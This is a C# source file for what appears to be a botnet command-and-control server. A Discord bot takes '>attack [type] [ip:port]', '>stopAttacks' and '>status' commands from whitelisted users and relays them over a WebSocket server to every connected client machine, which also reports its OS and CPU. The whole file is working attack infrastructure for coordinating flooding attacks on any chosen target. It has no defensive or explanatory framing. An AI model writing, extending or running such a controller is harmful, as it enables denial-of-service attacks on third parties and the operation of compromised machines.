using System.Net;
using Discord;

using Serilog;
using Serilog.Core;

using Discord.Commands;
using Discord.WebSocket;

using WatsonWebsocket;

using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

using System.Text;

namespace india_command_center;

public class Config
{
    public string ip { get; set; }
    public string port { get; set; }
    public string token { get; set; }
    public List<string> whitelistedUsers { get; set; }
}

public class Main
{
    private readonly Logger _log = new LoggerConfiguration()
        .WriteTo.Console()
        .CreateLogger();

    private readonly DiscordSocketClient _client = new(new DiscordSocketConfig
    {
        GatewayIntents = GatewayIntents.AllUnprivileged | GatewayIntents.MessageContent
    });

    private readonly CommandService _command = new();
    private WatsonWsServer? _ws = null;

    private readonly Dictionary<Guid, ResponseStatus> _statusCache = new();

    private List<string>? _whitelisted = null;
    
    private Task Log(LogMessage msg)
    {
        switch (msg.Severity)
        {
            case LogSeverity.Debug:
                _log.Debug(msg.ToString());
                break;

            case LogSeverity.Error:
                _log.Error(msg.ToString());
                break;

            case LogSeverity.Info:
                _log.Information(msg.ToString());
                break;
            
            case LogSeverity.Warning:
                _log.Warning(msg.ToString());
                break;
        }

        return Task.CompletedTask;
    }

    private void HandleHelp(SocketMessage msg)
    {
        msg.Channel.SendMessageAsync("commands are:\n" +
                                     ">help\n" +
                                     ">status\n" +
                                     ">attack [type] [ip:port]\n" +
                                     ">stopAttacks\n");
    }

    private void HandleStatus(SocketMessage msg)
    {
        foreach (var client in _ws.ListClients())
        {
            _ws.SendAsync(client.Guid, SerializePacket(new Packet<RequestStatus>("requestStatus", new RequestStatus())));
        }

        var toSend = string.Empty;

        foreach (var s in _statusCache)
        {
            var status = s.Value;

            toSend += $"{s.Key} - OS: {status.os}; CPU: {status.cpu}\n";
        }

        msg.Channel.SendMessageAsync(toSend);

        _statusCache.Clear();
    }

    private async void HandleAttack(string[] args, SocketMessage msg)
    {
        if (args.Length == 1)
        {
            await msg.Channel.SendMessageAsync("enter arguments [type] [ip:port]!");
            return;
        }

        if (args.Length == 3)
        {
            var type = Convert.ToInt32(args[1]);
            var ipport = args[2];

            await msg.Channel.SendMessageAsync($"starting attack on {ipport}, with {type} type.");

            var attackStruct = new Attack
            {
                ipPort = ipport,
                type = type
            };

            var pkt = new Packet<Attack>("attack", attackStruct);

            foreach (var client in _ws.ListClients())
            {
                if (await _ws.SendAsync(client.Guid, SerializePacket(pkt)))
                    await msg.Channel.SendMessageAsync($"sent attack packet to {client.Guid}!");
            }
        }
        else
        {
            await msg.Channel.SendMessageAsync("wrong args layout, must be >attack [type] [ip:port]!");
        }
    }

    private async void HandleStopAttacks(SocketMessage msg)
    {
        var pkt = new Packet<StopAttacks>("stopAttacks", new StopAttacks());

        foreach (var client in _ws.ListClients())
        {
            if (await _ws.SendAsync(client.Guid, SerializePacket(pkt)))
                await msg.Channel.SendMessageAsync($"sent stop attacks packet to {client.Guid}!");
        }
    }

    private async Task MessageReceived(SocketMessage msg)
    {
        _log.Information($"[#{msg.Channel.Name}] {msg.Author.Username}: {msg.Content}");

        if (msg.Author.IsBot || msg.Author.IsWebhook || !_whitelisted.Contains(msg.Author.Username))
            return;

        if (string.IsNullOrEmpty(msg.Content) || !msg.Content.StartsWith(">"))
            return;

        string[] args = msg.Content[1..].Split(' ', StringSplitOptions.RemoveEmptyEntries);

        string command = args[0];

        switch (command)
        {
            case "help":
                HandleHelp(msg);
                break;

            case "status":
                HandleStatus(msg);
                break;
            
            case "attack":
                HandleAttack(args, msg);
                break;
            
            case "stopAttacks":
                HandleStopAttacks(msg);
                break;
        }
    }

    private async void ClientConnected(object? s, ConnectionEventArgs msg)
    {
        _log.Information($"client connected ({msg.Client.IpPort}, {msg.Client.Guid})");
    }

    private async void DataReceived(object? s, MessageReceivedEventArgs msg)
    {
        _log.Information($"received from client ({msg.Client.Guid})");

        try
        {
            var packet = DeserializePacket(Encoding.UTF8.GetString(msg.Data));
            switch (packet.type)
            {
                case "responseStatus":
                    var statusPkt = packet as Packet<ResponseStatus>;

                    _statusCache[msg.Client.Guid] = statusPkt.content;

                    break;
            }
        }
        catch (Exception e)
        {
            _log.Error($"Got exception, while receiving data: {e.Message}");
        }
    }

    private async void ClientDisconnected(object? s, DisconnectionEventArgs msg)
    {
        _log.Information($"disconnected client ({msg.Client.IpPort}, {msg.Client.Guid})");
    }

    public string SerializePacket(IPacket pkt)
    {
        return JsonConvert.SerializeObject(pkt);
    }

    public IPacket DeserializePacket(string data)
    {
        var json = JObject.Parse(data);

        return json["type"]?.Value<string>() switch
        {
            "requestStatus" => json.ToObject<Packet<RequestStatus>>(),
            "responseStatus" => json.ToObject<Packet<ResponseStatus>>(),

            _ => throw new JsonException("Unknown packet type")
        };
    }

    public async Task Start()
    {
        var start = DateTime.Now;

        _log.Information("Initializing command center..");

        Config cfg = new Config
        {
            ip = "127.0.0.1",
            port = "1488",
            token = "????",
            whitelistedUsers = ["linux_segfault"]
        };

        if (!File.Exists("./config.json"))
        {
            await File.WriteAllTextAsync("./config.json", JsonConvert.SerializeObject(cfg, Formatting.Indented));
        }
        else
        {
            cfg = JsonConvert.DeserializeObject<Config>(await File.ReadAllTextAsync("./config.json"));
        }

        _ws = new(cfg.ip, Convert.ToInt32(cfg.port));

        _whitelisted = cfg.whitelistedUsers;

        _ws.ClientConnected += ClientConnected;
        _ws.MessageReceived += DataReceived;
        _ws.ClientDisconnected += ClientDisconnected;

        await _ws.StartAsync();

        _log.Information("Initializing Discord..");

        _client.Log += Log;
        _command.Log += Log;

        _client.MessageReceived += MessageReceived;

        await _client.LoginAsync(TokenType.Bot, cfg.token);
        await _client.StartAsync();
        
        var end = DateTime.Now;

        _log.Information($"Loaded in {(end - start).Milliseconds}ms");

        await Task.Delay(-1);
    }
}
